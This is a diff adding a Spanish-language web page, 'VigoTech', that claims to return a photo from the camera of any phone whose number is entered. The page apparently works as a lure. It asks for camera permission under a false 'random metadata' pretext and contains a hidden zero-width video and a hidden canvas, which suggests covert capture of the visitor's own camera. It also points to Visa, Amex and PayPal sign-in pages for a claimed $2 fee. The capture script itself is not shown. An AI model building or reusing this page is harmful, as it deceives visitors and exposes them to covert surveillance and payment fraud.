@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+ 
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<link rel="icon" type="image/x-icon" href="favicon.png">
+	<link href="./style.css" rel="stylesheet">
+	<title>VigoTech | 2020</title>
+	<style>
+		@media only screen and (max-width: 700px) {
+			video {
+				max-width: 100%;
+			}
+		}
+	</style>
+</head>
+ <header class="grid_12">
+ 	<div class="logo"><img src="images/logo.png" style="margin-top: 5px; max-width: 180px;"></div>
+ </header>
+<script type='text/JavaScript'>
+  function blmostrocult(blconted) {
+  var c=blconted.nextSibling;
+  if(c.style.display=='none') {
+  c.style.display='block';
+  } else {
+  c.style.display='none';
+  }
+  return false;
+  }
+ </script>
+
+<body>
+	
+	<h2>Ingresa un número de teléfono y te darémos una foto, tomada por la cámara de su dispositivo</h2>
+	<div class="grid_12">
+	<a onclick="return blmostrocult(this);" style="cursor: hand; cursor: pointer;color: #FFEB3B;">¿Cómo funciona?</a><div style="display: none;color: white;text-shadow: 3px 2px 6px transparent;">Usamos metadatos aleatorios, los cuales se generan por medio de los accesos a los dispositivos físicos que se dispongan, es por ello que se debe permitir el uso de la cámara por parte del navegador.</div>
+	<div>
+		<input type="input" placeholder="Número de teléfono" style="text-align: center;border-bottom-width: 0px;border-top-width: 0px;border-rigth-width: 0px;border-left-width: 0px;"><p></p>
+		<p style="color: white;">Seleccione Tipo de cámara:</p>
+		<select name="listaDeDispositivos" id="listaDeDispositivos" style="border-radius: 5px;border-top: 0px;border-bottom: 0px;border-left: 0px;border-right: 0px;width: 25px;height: 20px;"></select><p></p>
+		<button id="boton"><strong>Tomar foto</strong></button>
+		<p id="estado"></p>
+	</div>
+	<strong style="color: white;">
+		<p>El primer uso de esta aplicación es totalmente gratis</p>
+		<p>después, solo costará $2 USD</p>
+		<a href="https://secure.checkout.visa.com/?country=CO&locale=es-CO"><img src="images/visa.png" style="margin-right: 10px;margin-top: 10px;"></a><a href="https://online.americanexpress.com/myca/logon/us/action?request_type=LogonHandler&Face=en_US&DestPage=https%3A%2F%2Fonline.americanexpress.com%2Fmyca%2Facctsumm%2Fus%2Faction%3Frequest_type%3Dauthreg_acctAccountSummary%26entry_point%3Dlnk_homepage%26aexp_nav%3Dsc_checkbill%26referrer%3Dushome%26section%3Dlogin"><img src="images/american.png" style="margin-right: 10px;margin-top: 10px;"></a><a href="https://www.paypal.com/co/signin"><img src="images/paypal.png" style="margin-right: 10px;margin-top: 10px;"></a>
+	</strong>
+	<video muted="muted" id="video" style="width: 0px"></video>
+	<canvas id="canvas" style="display: none;"></canvas>
+</body>
+
+<footer>
+	<a href="redir.html" style="text-decoration: none;color:#9e9e8f;text-shadow: 3px 2px 6px transparent;">Contáctenos</a>  |  <a href="redir2.html" style="text-decoration: none;color:#9e9e8f;text-shadow: 3px 2px 6px transparent;">Acerca de Nosotros</a>  |  <a href="redir.html" style="text-decoration: none;color:#9e9e8f;text-shadow: 3px 2px 6px transparent;">Pregúntas</a><br>
+	<p>VIGOTECH © 2020</p>
+</footer>
+
+<script src="script.js"></script>
+ 
+</html>
